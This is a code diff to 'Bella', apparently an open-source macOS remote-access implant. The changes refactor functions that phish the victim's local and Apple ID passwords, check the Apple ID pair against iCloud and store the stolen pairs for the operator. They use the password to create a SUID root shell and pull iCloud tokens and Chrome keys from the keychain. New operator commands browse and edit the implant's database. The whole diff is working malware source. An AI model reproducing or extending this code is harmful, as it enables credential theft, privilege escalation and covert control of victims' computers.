@@ -150,6 +150,34 @@ def readDB(column, payload=False):
 		return False
 	return base64.b64decode(value) #DECODES the data that updatedb ENCODES!
 
+##Debug functions
+def browseDB(table="bella"):
+	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
+	conn.row_factory = sqlite3.Row
+	c = conn.cursor()
+	c.execute("SELECT * FROM %s" % table)
+	r = c.fetchone()
+	for i in range(0,len(r)):
+		try:
+			send_msg("%s: %s\n\n"% (r.keys()[i],decrypt(base64.b64decode(r[i]))),False) #Decode then decrypy
+		except:
+			try:
+				send_msg("%s: %s\n"% (r.keys()[i],base64.b64decode(r[i])),False) #Decode
+			except TypeError:
+				send_msg("%s: %s\n"% (r.keys()[i],r[i]),False) #Plaintext
+	send_msg("",True)
+	conn.close()
+
+def editDB(param,value,table="bella"):
+	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
+	if (value == "NULL"):
+		conn.execute("UPDATE %s SET %s = NULL WHERE id = %s" % (table,param,bella_UID))
+	else:
+		conn.execute("UPDATE %s SET %s = \"%s\"  WHERE id = %s" % (table,param, value,bella_UID))
+	conn.commit()
+	conn.close()
+	send_msg("%s Updated Database!\n" % greenPlus,True)
+
 def updateDB(data, column):
 	data = base64.b64encode(data) #readDB will return this data DECODED
 	if not os.path.isfile("%sbella.db" % get_bella_path()):
@@ -292,38 +320,43 @@ def appleIDPhish(username, GUIUser):
 			out = out[1]
 			passw = out.replace('\n', '')
 			send_msg("%sUser has attempted to use password: %s\n" % (blue_star, passw), False)
-			try:
-				request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
-				base64string = base64.encodestring('%s:%s' % (username, passw)).replace('\n', '')
-				request.add_header("Authorization", "Basic %s" % base64string)
-				result = urllib2.urlopen(request)
-				out2 = result.read()
-			except Exception, e:
-				if str(e) == "HTTP Error 401: Unauthorized":
-					out2 = "fail?"
-				elif str(e) == "HTTP Error 409: Conflict":
-					out2 = "2sV"
-				else:
-					out2 = "otherError!"
+			check_apple_pass(username,passw)
+			send_msg('', True)
+			return 1
 
-			if out2 == "fail?":
-				send_msg(red_minus + "Bad combo: [%s:%s]\n" % (username, passw), False)
-				continue
-			elif out2 == "2sV":
-				send_msg("%sVerified! [2FV Enabled] Account -> [%s:%s]%s\n" % (greenPlus, username, passw, endANSI), False)
-				updateDB(encrypt("%s:%s" % (username, passw)), 'applePass')
-				os.system("osascript -e 'tell application \"iTunes\"' -e \"play\" -e \"end tell\";")
-				break
-			elif out2 == "otherError!":
-				send_msg("%sMysterious error with [%s:%s]\n" % (red_minus, username, passw), False)
-				break
-			else:
-				send_msg("%sVerified! Account -> %s[%s:%s]%s\n" % (greenPlus, bold, username, passw, endANSI), False)
-				updateDB(encrypt("%s:%s" % (username, passw)), 'applePass')
-				os.system("osascript -e 'tell application \"iTunes\"' -e \"play\" -e \"end tell\";")
-				break
-	send_msg('', True)
-	return 1
+def check_apple_pass(user,pw):
+	try:
+		request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
+		base64string = base64.encodestring('%s:%s' % (user, pw)).replace('\n', '')
+		request.add_header("Authorization", "Basic %s" % base64string)
+		result = urllib2.urlopen(request)
+		out2 = result.read()
+	except Exception, e:
+		if str(e) == "HTTP Error 401: Unauthorized":
+			out2 = "fail?"
+		elif str(e) == "HTTP Error 409: Conflict":
+			out2 = "2sV"
+		elif "nodename nor servname provided" in str(e):
+			out2 = "offline"
+		else:
+			out2 = "otherError!"
+			send_msg(str(e),False)
+	if out2 == "fail?":
+		send_msg(red_minus + "Bad combo: [%s:%s]\n" % (user, pw), False)
+	elif out2 == "2sV":
+		send_msg("%sVerified! [2FV Enabled] Account -> [%s:%s]%s\n" % (greenPlus, user, pw, endANSI), False)
+		updateDB(encrypt("%s:%s" % (user, pw)), 'applePass')
+		os.system("osascript -e 'tell application \"iTunes\"' -e \"play\" -e \"end tell\";")
+	elif out2 == "offline":
+		send_msg("%sCan't reach Apple at this time.\n" % red_minus, False)
+	elif out2 == "otherError!":
+		send_msg("%sMysterious error with [%s:%s]\n" % (red_minus, user, pw), False)
+	else:
+		send_msg("%sVerified! Account -> %s[%s:%s]%s\n" % (greenPlus, bold, user, pw, endANSI), False)
+		updateDB(encrypt("%s:%s" % (user, pw)), 'applePass')
+		os.system("osascript -e 'tell application \"iTunes\"' -e \"play\" -e \"end tell\";")
+	send_msg("",True)
+	return
 
 def is_there_SUID_shell():
 	if os.getuid() == 0:
@@ -1310,30 +1343,33 @@ def bella_info():
 		send_msg("%sGoogle Chrome Safe Storage Key: \n\t[%s]\n" % (yellow_star, checkChrome), False)
 
 	checkLP = local_pw_read()
-	if isinstance(checkLP, str):
-		send_msg("%s%s's local account password is available.\n" % (yellow_star, checkLP.split(':')[0]), False) #get username
-		if not readDB('mme_token'):
-			send_msg("\t%sAttempting to generate iCloud Auth Keys with local password.\n" % blue_star, False)
-			iCloud = chainbreaker(kchain, 0, 'iCloud', checkLP.split(':')[1])
-			send_msg("\t%siCloud:\n\t    [%s]\n" % (yellow_star, iCloud[0]), False)
-			if iCloud[1]:
-				send_msg("\t%sGot iCloud Key! Decrypting plist.\n" % yellow_star, False)
-				decrypted = kciCloudHelper(iCloud[0])
-				if not decrypted:
-					send_msg("\t%sError getting decrypted MMeAuthTokens with local password.\n" % red_minus, False)
-				else:
-					send_msg("\t%sDecrypted. Updating Bella database.\n" % blue_star, False)
-					updateDB(encrypt(decrypted), 'mme_token')
-					send_msg("\t%sUpdated DB.\n\t    --------------\n" % greenPlus, False)
-		if not readDB('chromeSS'):
-			send_msg("\t%sAttempting to generate Chrome Safe Storage Keys.\n" % blue_star, False)
-			chrome = chainbreaker(kchain, 0, 'Chrome Safe Storage', checkLP.split(':')[1])
-			send_msg("\t%sChrome:\n\t    [%s]\n" % (yellow_star, chrome[0]), False)
-			if chrome[1]:
-				send_msg("\t%sGot Chrome Key! Updating Bella DB.\n" % yellow_star, False)
-				updateDB(encrypt(chrome[0]), 'chromeSS')
-				send_msg("\t%sUpdated DB.\n" % greenPlus, False)
-
+	try:
+		(tempuser,tempass) = checkLP.split(":")
+		if verifyPassword(tempuser,tempass):
+			send_msg("%s%s's local account password is available.\n" % (yellow_star, checkLP.split(':')[0]), False) #get username
+			if not readDB('mme_token'):
+				send_msg("\t%sAttempting to generate iCloud Auth Keys with local password.\n" % blue_star, False)
+				iCloud = chainbreaker(kchain, 0, 'iCloud', checkLP.split(':')[1])
+				send_msg("\t%siCloud:\n\t    [%s]\n" % (yellow_star, iCloud[0]), False)
+				if iCloud[1]:
+					send_msg("\t%sGot iCloud Key! Decrypting plist.\n" % yellow_star, False)
+					decrypted = kciCloudHelper(iCloud[0])
+					if not decrypted:
+						send_msg("\t%sError getting decrypted MMeAuthTokens with local password.\n" % red_minus, False)
+					else:
+						send_msg("\t%sDecrypted. Updating Bella database.\n" % blue_star, False)
+						updateDB(encrypt(decrypted), 'mme_token')
+						send_msg("\t%sUpdated DB.\n\t    --------------\n" % greenPlus, False)
+			if not readDB('chromeSS'):
+				send_msg("\t%sAttempting to generate Chrome Safe Storage Keys.\n" % blue_star, False)
+				chrome = chainbreaker(kchain, 0, 'Chrome Safe Storage', checkLP.split(':')[1])
+				send_msg("\t%sChrome:\n\t    [%s]\n" % (yellow_star, chrome[0]), False)
+				if chrome[1]:
+					send_msg("\t%sGot Chrome Key! Updating Bella DB.\n" % yellow_star, False)
+					updateDB(encrypt(chrome[0]), 'chromeSS')
+					send_msg("\t%sUpdated DB.\n" % greenPlus, False)
+	except AttributeError:
+		pass
 
 	checkAP = applepwRead()
 	if isinstance(checkAP, str):
@@ -1379,7 +1415,10 @@ def make_SUID_root_binary(password, LPEpath):
 		try:
 			subprocess.check_output("echo %s | sudo -S ls" % password, shell=True) #this will return no error if successfull
 		except Exception as e:
-			return (False, "%sUser's local password does not give us sudo access!\n" % red_minus)
+			if verifyPassword(cur_GUI_user(),local_pw_read().split(':')[1]):
+				return (False, "%sUser's local password does not give us sudo access!\n" % red_minus)
+			else:
+				return (False, "%sLooks like user's password was changed! you may have to phish it again.\n" % red_minus)
 		try:
 			subprocess.check_output("echo %s | sudo -S chown 0:0 %s; echo %s | sudo -S chmod 4777 %s" % (password, ROOT_SHELL_PATH, password, ROOT_SHELL_PATH), shell=True) #perform setUID on shell
 		except Exception as e:
@@ -1716,8 +1755,13 @@ def user_pass_phish():
 			return
 		check = local_pw_read()
 		if isinstance(check, str):
-			send_msg("%sAccount password already found:\n%s\n" % (blue_star, check.replace("\n", "")), True)
-			return 1
+			send_msg("%sAccount password already found:\n%s\n" % (blue_star, check.replace("\n", "")), False)
+			if (not verifyPassword(userTB, check)):
+				send_msg("%s Looks like user changed password! phishing again.\n" % red_minus, False)
+				pass
+			else:
+				send_msg("",True)
+				return 1
 		FNULL = open(os.devnull, 'w') ## open /dev/null to pipe STDERR to it
 
 		try:
@@ -1727,13 +1771,7 @@ def user_pass_phish():
 			send_msg("%sUser has attempted to use password: [%s]\n" % (blue_star, password), False)
 			if password == "":
 				continue
-			if verifyPassword(userTB, password):
-				send_msg("%sVerified! Account password is: [%s]%s\n" % (greenPlus, password, endANSI), False)
-				subprocess_cleanup()
-				updateDB(encrypt("%s:%s" % (userTB, password)), 'localPass') #store encrypted pass in DB
-				#os.system("networksetup -setairportpower en0 on") #enable Wi-Fi
-				send_msg("%sUsing this password to root Bella.\n" % yellow_star, False)
-				rooter()
+			if check_local_pass(userTB, password):
 				return 1
 			else:
 				send_msg("%sUser input: [%s] failed. Trying again.\n" % (red_minus, password), False)
@@ -1742,6 +1780,17 @@ def user_pass_phish():
 				send_msg("%sUser canceled. Trying again.\n" % (red_minus), False)
 
 	return 1 #this should never get here, while loop should continue indefinitely.
+
+def check_local_pass(user,pw):
+	if verifyPassword(user, pw):
+		send_msg("%sVerified! Account password is: [%s]%s\n" % (greenPlus, pw, endANSI), False)
+		subprocess_cleanup()
+		updateDB(encrypt("%s:%s" % (user, pw)), 'localPass') #store encrypted pass in DB
+		send_msg("%sUsing this password to root Bella.\n" % yellow_star, False)
+		rooter()
+		return True
+	else:
+		return False
 
 def verifyPassword(username, password):
 	try:
@@ -1929,6 +1978,11 @@ def bella(*Emma):
 						send_msg("%sAlready have an apple pass.\n%s\n" % (blue_star, check), True)
 					else:
 						send_msg("appleIDPhishHelp" + appleIDPhishHelp(), True)
+				elif data == "appleIDsubmit":
+					if isinstance(applepwRead(),str):
+						send_msg("%sAlready have an apple pass.\n%s\n" % (blue_star, check), True)
+					else:
+						send_msg("appleIDsubmit" + appleIDPhishHelp(), True)
 				elif data.startswith("iCloudPhishFinal"):
 					appleIDPhish(data[16:].split(":")[0], data[16:].split(":")[1])
 				elif data == "user_pass_phish":
@@ -2130,6 +2184,26 @@ def bella(*Emma):
 						send_msg('Error-MB-Pro -> Error', True)
 						continue
 					send_msg(output[1], True)
+
+				elif data == 'browseDB':
+					browseDB()
+
+				elif data.startswith("editDB"):
+					try:
+						(param, value) = data[7:].split(' ')
+						editDB(param,value)
+					except ValueError:
+						send_msg('%s Usage: %s editDB parameter new-value %s\n' % (red_minus, red, endANSI), True)
+
+				elif data.startswith("submit_local_pass"):
+					testpass = data.split(":::")[1]
+					if not check_local_pass(cur_GUI_user(),testpass):
+						send_msg("%sPassword [%s] incorrect for %s.\n" % (red_minus,testpass,cur_GUI_user()), True)
+
+				elif data.startswith("submit_iCloud_pass"):
+					(aID,testpass) = data.split(":::")[1].split(":")
+					check_apple_pass(aID,testpass)
+
 
 				else:
 					try:
